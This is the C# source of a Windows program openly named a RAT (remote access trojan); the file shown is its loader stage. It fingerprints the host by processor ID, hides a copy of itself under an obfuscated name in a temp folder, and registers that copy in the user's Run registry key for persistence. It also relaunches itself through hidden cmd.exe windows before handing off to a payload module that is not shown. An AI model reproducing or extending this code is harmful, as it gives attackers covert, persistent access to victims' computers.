using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace RAT
{
    class Program
    {
        /*
         * This is a RAT to remove please redownload and execute <Filename>.exe /clean
         * 
         */
        public static String ran = "";
        public static String SystemID;
        public static String ProccessName = ProccessNameShort + ".exe";
        public static String ProccessNameShort = "CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316ieh2812812390dsfhfd8uasfi2823";

        public static string CreateMD5(string input)
        {
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }
        public static String uid()
        {
            string cpuInfo = string.Empty;
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();
            foreach (ManagementObject mo in moc)
            {
                if (cpuInfo == "")
                {
                    cpuInfo = mo.Properties["processorID"].Value.ToString();
                    break;
                }
            }
            return CreateMD5(cpuInfo).Substring(0, 20);
        }
        public static void random()
        {
            Random rnd = new Random();
            int length = 30;
            for (var i = 0; i < length; i++)
            {
                ran += ((char)(rnd.Next(1, 26) + 64)).ToString();
            }
        }
        public static String[] files = new string[]
        {
            Path.GetTempPath()+"\\CCikJxPYTIYIWqFQtbykmhPH0hFyvJtNWalDOpesVeIQOV5316ieh2812812390dsfhfd8uasfi2823"
        };
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();
        static void Main(string[] args)
        {
            // FreeConsole();
            SystemID = "LOG_"+uid();
            try
            {
                random();
                try
                {
                    if (args[0].Contains("clean")) { cleanup(); }
                }
                catch { }
                try
                {
                    if (System.Reflection.Assembly.GetExecutingAssembly().Location.Contains(Path.GetTempPath() + SystemID))
                    {
                        Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); //Adds to startup programs
                        key.SetValue(SystemID, System.Reflection.Assembly.GetExecutingAssembly().Location);
                        /*
                         * START PAYLOAD HERE
                         */
                        RAT.Payload.main();
                    }
                    else
                    {
                        Hide();
                    }
                }
                catch (Exception e)
                {
                    Hide();
                }
                Console.ReadLine();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();
            }
        }
        public static void Hide()
        {
            try
            {

                if (Directory.Exists(Path.GetTempPath() + "\\" + SystemID))
                {
                    Directory.Delete(Path.GetTempPath() + "\\" + SystemID);
                    Directory.CreateDirectory(Path.GetTempPath() + SystemID);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
                    restart();
                }
                else
                {
                    Directory.CreateDirectory(Path.GetTempPath() + SystemID);
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
                    restart();
                }
            }
            catch
            {
                restart();
            }
        }
        public static void restart()
        {
            try
            {
                String exec = " taskkill /f /im "+ ProccessName;
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C " + exec;
                process.StartInfo = startInfo;
                process.Start();
            }
            catch { }

            try
            {
                System.Diagnostics.Process.Start(Path.GetTempPath() + $"\\{SystemID}\\{ProccessNameShort}.exe");
                System.Environment.Exit(1);
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
                Console.ReadLine();
                cleanup();
            }

        }
        public static void cleanup()
        {
            String[] fileloc = File.ReadAllLines(files[0]);
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue(fileloc[0], false);
            String exec = " taskkill /f /im "+Program.ProccessName;
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + exec;
            process.StartInfo = startInfo;
            process.Start();
            try
            {
                String[] loc = File.ReadAllLines(files[0]);
                Directory.Delete(Path.GetTempPath() + loc[0], true);
            }
            catch { Console.WriteLine("[!] Failed Deepclean doing essential clean"); }
            foreach (String file in files)
            {
                try
                {
                    Directory.Delete(file);
                }
                catch
                {
                    File.Delete(file);
                }
            }
            System.Environment.Exit(1);
        }
    }
}
